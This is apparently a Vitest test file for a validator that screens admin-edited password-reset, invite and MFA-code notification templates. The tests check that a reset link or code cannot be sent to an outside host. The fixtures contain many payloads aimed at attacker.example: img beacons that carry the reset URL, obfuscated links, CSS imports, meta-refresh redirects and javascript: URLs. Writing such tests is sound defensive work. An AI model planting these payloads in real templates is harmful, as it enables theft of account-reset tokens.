// Copyright (c) 2024-2026 EVtivity. All rights reserved.
// SPDX-License-Identifier: BUSL-1.1

import { existsSync, readFileSync, readdirSync } from 'node:fs';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import { SECURITY_TEMPLATE_EVENTS, isSecurityTemplateEventType } from '../notification-events.js';
import {
  hostReferences,
  securityTemplateRenderProblem,
  securityTemplateSaveProblems,
} from '../security-template.js';
import { expectLinearTime } from './helpers/linear-time.js';

const TRUSTED = ['https://csms.example.com', 'https://portal.example.com'];

const SHIPPED_RESET = '<p>Reset: <a href="{{resetUrl}}">{{resetUrl}}</a></p>';

function save(
  bodyHtml: string,
  extra: Partial<Parameters<typeof securityTemplateSaveProblems>[0]> = {},
) {
  return securityTemplateSaveProblems({
    eventType: 'operator.ForgotPassword',
    channel: 'email',
    subject: null,
    bodyHtml,
    shippedBody: SHIPPED_RESET,
    trustedUrls: TRUSTED,
    ...extra,
  });
}

describe('security template event list', () => {
  it('covers the reset, invite, verification, code, onboarding and security notice events', () => {
    for (const type of [
      'operator.ForgotPassword',
      'operator.UserCreated',
      'driver.ForgotPassword',
      'driver.AccountVerification',
      'driver.PortalInvite',
      'driver.RegistrationAttempt',
      'mfa.VerificationCode',
      'site.PayoutOnboarding',
      'security.FactorRemoved',
      'security.EmailChanged',
    ]) {
      expect(isSecurityTemplateEventType(type)).toBe(true);
    }
    expect(isSecurityTemplateEventType('session.Receipt')).toBe(false);
    expect(isSecurityTemplateEventType('__proto__')).toBe(false);
  });
});

describe('hostReferences', () => {
  const REFERENCE = /([a-z][a-z0-9+.-]*:)?[/\\]{2,}([^\s"'<>()\\/?#]*)/gi;

  it('finds what the reference pattern matches', () => {
    expect(hostReferences('x 1ab://h.example/p //c.example a:b:\\\\d')).toEqual([
      { scheme: 'ab:', hostPart: 'h.example' },
      { scheme: undefined, hostPart: 'c.example' },
      { scheme: 'b:', hostPart: 'd' },
    ]);
    const alphabet = ['a', 'B', '1', '+', '.', '-', ':', '/', '\\', ' ', '"', '@', '?'];
    let seed = 11;
    const next = () => {
      seed = (seed * 1103515245 + 12345) % 2147483648;
      return seed;
    };
    for (let n = 0; n < 20_000; n++) {
      let text = '';
      const length = next() % 16;
      for (let k = 0; k < length; k++) text += alphabet[next() % alphabet.length] ?? '';
      const expected = [...text.matchAll(REFERENCE)].map((m) => ({
        scheme: m[1],
        hostPart: m[2] ?? '',
      }));
      expect(hostReferences(text), JSON.stringify(text)).toEqual(expected);
    }
  });

  it('scans crafted input in linear time', () => {
    const crafted: [string, (scale: number) => string][] = [
      ['letters', (scale) => 'a'.repeat(12_500 * scale)],
      ['letters and digits', (scale) => 'a1'.repeat(6_250 * scale)],
      ['letters then a scheme separator', (scale) => `${'a'.repeat(12_500 * scale)}:/`],
    ];
    for (const [label, build] of crafted) {
      expectLinearTime(label, build, (text) => {
        hostReferences(text);
        save(`<p>${text}</p><a href="{{resetUrl}}">x</a>`);
      });
    }
  });
});

describe('securityTemplateSaveProblems', () => {
  it('ignores other event types', () => {
    expect(
      save('<img src="https://attacker.example/x">', { eventType: 'session.Receipt' }),
    ).toBeNull();
  });

  it('accepts the link as a whole href, as text, and links to the CSMS and portal', () => {
    expect(
      save(
        '<p>Hello {{firstName}}</p><p><a href="{{resetUrl}}">Reset</a> {{resetUrl}}</p>' +
          '<img src="https://csms.example.com/logo.png"><a href="https://portal.example.com/help">Help</a>' +
          '<a href="mailto:{{companyContactEmail}}">Mail</a>',
      ),
    ).toBeNull();
  });

  it('refuses the reset link inside another URL', () => {
    expect(
      save('<a href="{{resetUrl}}">x</a><img src="https://attacker.example/p?u={{resetUrl}}">'),
    ).toEqual(expect.objectContaining({ bodyHtml: expect.stringContaining('{{resetUrl}}') }));
    expect(save('<a href="{{resetUrl}}">x</a><img src="{{resetUrl}}">')).not.toBeNull();
    expect(save('<a href="{{companyName}}{{resetUrl}}">x</a>')).not.toBeNull();
    expect(
      save('<a href="{{resetUrl}}">x</a> https://csms.example.com/?u={{resetUrl}}'),
    ).not.toBeNull();
  });

  it('refuses a link to any other host, however it is written', () => {
    for (const body of [
      '<a href="https://attacker.example/">Reset</a>',
      '<a href="//attacker.example/">Reset</a>',
      '<a href="https:attacker.example">Reset</a>',
      '<a href="ht&#9;tps://attacker.example">Reset</a>',
      '<a href="https:&#x2F;&#x2F;attacker.example">Reset</a>',
      '<a href="javascript:alert(1)">Reset</a>',
      '<img src="data:image/png;base64,AAAA">',
      '<div style="background:url(//attacker.example/p)">x</div>',
      '<img srcset="a.png 1x, https://attacker.example/b.png 2x">',
      '<meta http-equiv="refresh" content="0;url=https://attacker.example">',
      '<!--[if mso]><v:image src="https://attacker.example/p"><![endif]-->',
      '<style>@import url(https://attacker.example/s.css);</style>',
      '<p>Visit https://attacker.example now</p>',
      '<a href="https://{{companyName}}.example/">x</a>',
      '<a href="https://csms.example.com{{companyName}}/">x</a>',
      '<a href="https://csms.example.com.attacker.example/">x</a>',
      '<a href="https://csms.example.com\\@attacker.example/">x</a>',
    ]) {
      expect(save(`<a href="{{resetUrl}}">x</a>${body}`), body).not.toBeNull();
    }
  });

  it('checks every if/else branch', () => {
    expect(
      save(
        '{{#if firstName}}<a href="{{resetUrl}}">x</a>{{else}}<img src="https://attacker.example/?{{resetUrl}}">{{/if}}',
      ),
    ).not.toBeNull();
  });

  it('refuses a template that drops the link or is empty', () => {
    expect(save('<p>Hello</p>')).toEqual({ bodyHtml: expect.stringContaining('{{resetUrl}}') });
    expect(save('   ')).toEqual({ bodyHtml: expect.stringContaining('empty') });
  });

  it('keeps the code out of every attribute and other URLs', () => {
    const shipped = '<p>Your code: {{code}}</p>';
    const draft = { eventType: 'mfa.VerificationCode', shippedBody: shipped };
    expect(save('<p>Code: {{code}}</p>', draft)).toBeNull();
    expect(save('<p>{{code}}</p><img alt="{{code}}">', draft)).not.toBeNull();
    expect(
      save('<p>{{code}}</p><a href="https://csms.example.com/?c={{code}}">x</a>', draft),
    ).not.toBeNull();
  });

  it('checks the subject and plain text channels', () => {
    expect(save(SHIPPED_RESET, { subject: 'Reset at https://attacker.example' })).toEqual({
      subject: expect.any(String),
    });
    const sms = { channel: 'sms', shippedBody: 'Reset: {{resetUrl}}' };
    expect(save('Reset your password: {{resetUrl}}', sms)).toBeNull();
    expect(save('Reset: https://attacker.example/r?u={{resetUrl}}', sms)).not.toBeNull();
    expect(save('Reset: x{{resetUrl}}', sms)).not.toBeNull();
  });

  it('accepts every shipped security template in every language', () => {
    const here = dirname(fileURLToPath(import.meta.url));
    const roots = [
      resolve(here, '..', '..', '..', 'api', 'src', 'templates'),
      resolve(here, '..', '..', '..', 'ocpp', 'src', 'templates'),
    ];
    let checked = 0;
    for (const root of roots) {
      for (const lang of readdirSync(root)) {
        for (const eventType of Object.keys(SECURITY_TEMPLATE_EVENTS)) {
          const dir = resolve(root, lang, ...eventType.split('.'));
          if (!existsSync(dir)) continue;
          for (const file of readdirSync(dir)) {
            if (file === 'subject.hbs') continue;
            const channel = file.replace(/\.hbs$/, '');
            const body = readFileSync(resolve(dir, file), 'utf-8');
            const subjectFile = resolve(dir, 'subject.hbs');
            const subject = existsSync(subjectFile) ? readFileSync(subjectFile, 'utf-8') : null;
            const problems = securityTemplateSaveProblems({
              eventType,
              channel,
              subject,
              bodyHtml: body,
              shippedBody: body,
              trustedUrls: TRUSTED,
            });
            expect(problems, `${lang}/${eventType}/${file}`).toBeNull();
            checked += 1;
          }
        }
      }
    }
    expect(checked).toBeGreaterThan(100);
  });
});

describe('securityTemplateRenderProblem', () => {
  const resetUrl = 'https://csms.example.com/reset-password?token=abc123';
  const rendered = (body: string, subject: string | null = null) =>
    securityTemplateRenderProblem({
      eventType: 'operator.ForgotPassword',
      channel: 'email',
      subject,
      body,
      shippedBody: SHIPPED_RESET,
      variables: { resetUrl, firstName: 'Ann' },
    });

  it('accepts the server link as a whole href or as text, entity-encoded as rendered', () => {
    const encoded = resetUrl.replace('=', '&#x3D;');
    expect(rendered(`<p><a href="${encoded}">Reset</a> ${encoded}</p>`)).toBeNull();
  });

  it('refuses a stored template that sends the link elsewhere or drops it', () => {
    expect(
      rendered(`<a href="${resetUrl}">x</a><img src="https://attacker.example/?u=${resetUrl}">`),
    ).not.toBeNull();
    expect(rendered('<p>Hello</p>')).not.toBeNull();
    expect(rendered('')).toBe('empty');
    expect(
      rendered(`<a href="${resetUrl}">x</a>`, `https://attacker.example/${resetUrl}`),
    ).not.toBeNull();
  });

  it('ignores other event types', () => {
    expect(
      securityTemplateRenderProblem({
        eventType: 'session.Receipt',
        channel: 'email',
        subject: null,
        body: '',
        shippedBody: null,
        variables: {},
      }),
    ).toBeNull();
  });
});
